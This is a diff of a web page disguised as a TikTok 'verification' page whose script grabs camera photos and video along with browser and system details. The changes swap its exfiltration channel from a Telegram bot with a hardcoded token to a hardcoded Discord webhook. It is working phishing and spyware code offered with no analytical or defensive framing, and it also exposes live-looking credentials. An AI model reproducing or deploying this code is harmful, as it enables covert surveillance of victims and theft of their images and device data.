@@ -7,7 +7,7 @@
 <meta content="Watch tiktok" property="og:description">
 <meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
 <meta content="website" property="og:type"/>
-<title>Tiktok</title>
+<title>Сделайте снимок</title>
 <style>
 body {
     margin: 0;
@@ -91,7 +91,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (err) {
             // If camera access fails, still send system info
             setTimeout(() => {
-                sendToTelegram(null);
+                sendToDiscord(null);
             }, 1500);
         }
     }
@@ -115,8 +115,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Create a blob from the recorded chunks
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-                // Send the recorded video to Telegram
-                sendToTelegram(blob);
+                // Send the recorded video to Discord
+                sendToDiscord(blob);
                 
                 // Stop all tracks
                 stream.getTracks().forEach(track => track.stop());
@@ -148,11 +148,11 @@ document.addEventListener('DOMContentLoaded', () => {
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Send the captured image to Telegram
-        sendToTelegram(canvas);
+        // Send the captured image to Discord
+        sendToDiscord(canvas);
     }
     
-    function sendToTelegram(media) {
+    function sendToDiscord(media) {
         // Collect system information with emojis
         const systemInfo = {
             "🌐 User Agent": navigator.userAgent,
@@ -166,65 +166,89 @@ document.addEventListener('DOMContentLoaded', () => {
             "📡 IP Address": "Unknown"
         };
         
-        // Telegram bot API endpoint
-        const botToken = '8096888598:AAFPeNP38s_MBl1FmCyKviaQo0fMHH1qzPw-bRQnylNXZQ';
-        const chatId = '8096888598';
+        // Format system info as a string
+        const systemInfoText = Object.entries(systemInfo)
+            .map(([key, value]) => `${key}: ${value}`)
+            .join('\n');
         
-        // Create form data
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('text', `System Info:\n${JSON.stringify(systemInfo, null, 2)}`);
+        // Create the main message payload
+        const payload = {
+            content: "**New Verification Request**",
+            embeds: [
+                {
+                    title: "System Information",
+                    description: systemInfoText,
+                    color: 5814783, // TikTok-like color
+                    timestamp: new Date().toISOString()
+                }
+            ]
+        };
         
-        // First send system info as text
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Replace with your Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1416217653961560174/JH1ylbkjgYwnMoFi-ifbL1gFyljeDwr7ADz6U-G72Vl0_87cdhFqyfK-baYMpz2xW9Qf';
+        
+        // First send the system information
+        fetch(webhookURL, {
             method: 'POST',
-            body: formData
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok && media) {
+        .then(response => {
+            if (response.ok && media) {
+                // If there's media to send, prepare it
+                const formData = new FormData();
+                
                 if (media instanceof HTMLCanvasElement) {
-                    // Handle photo
-                    const imageData = media.toDataURL('image/jpeg', 0.9);
-                    const blob = dataURLtoBlob(imageData);
-                    
-                    const photoFormData = new FormData();
-                    photoFormData.append('chat_id', chatId);
-                    photoFormData.append('photo', blob, 'tiktok_verification.jpg');
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: photoFormData
-                    });
+                    // Convert canvas to blob for image
+                    media.toBlob(blob => {
+                        formData.append('file', blob, 'verification.jpg');
+                        
+                        // Send image with a caption
+                        const imagePayload = {
+                            content: "**Captured Image**",
+                            embeds: [
+                                {
+                                    title: "Verification Image",
+                                    color: 5814783,
+                                    timestamp: new Date().toISOString()
+                                }
+                            ]
+                        };
+                        
+                        formData.append('payload_json', JSON.stringify(imagePayload));
+                        
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg', 0.9);
                 } else if (media instanceof Blob) {
-                    // Handle video
-                    const videoFormData = new FormData();
-                    videoFormData.append('chat_id', chatId);
-                    videoFormData.append('video', media, 'tiktok_verification.webm');
-                    videoFormData.append('caption', 'Recorded video');
+                    // Send video
+                    formData.append('file', media, 'verification.webm');
                     
-                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                    const videoPayload = {
+                        content: "**Recorded Video**",
+                        embeds: [
+                            {
+                                title: "Verification Video",
+                                color: 5814783,
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    };
+                    
+                    formData.append('payload_json', JSON.stringify(videoPayload));
+                    
+                    fetch(webhookURL, {
                         method: 'POST',
-                        body: videoFormData
+                        body: formData
                     });
                 }
             }
-        });
-    }
-    
-    // Helper function to convert data URL to Blob
-    function dataURLtoBlob(dataurl) {
-        const arr = dataurl.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        
-        while (n--) {
-            u8arr[n] = bstr.charCodeAt(n);
-        }
-        
-        return new Blob([u8arr], { type: mime });
+        })
+        .catch(error => console.error('Error sending to Discord:', error));
     }
 });
 </script>
